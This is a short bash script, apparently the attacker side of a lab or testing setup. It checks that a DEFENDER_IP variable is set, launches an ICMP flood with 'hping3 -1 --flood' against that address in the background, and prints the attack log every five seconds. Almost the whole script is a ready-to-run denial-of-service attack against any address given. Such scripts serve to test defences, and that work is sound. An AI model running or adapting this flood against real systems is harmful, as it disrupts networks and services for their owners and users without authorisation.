#!/bin/bash

# Check if DEFENDER_IP is set
if [ -z "$DEFENDER_IP" ]; then
  echo "DEFENDER_IP is not set"
  exit 1
else
  echo "DEFENDER_IP is set to $DEFENDER_IP"
fi

# Run the ICMP flood attack and log output to a file
echo "Starting ICMP flood attack on $DEFENDER_IP"
hping3 -1 --flood $DEFENDER_IP > /app/attack.log 2>&1 &

# Periodically check the log file and print its contents
while true; do
  cat /app/attack.log
  sleep 5
done
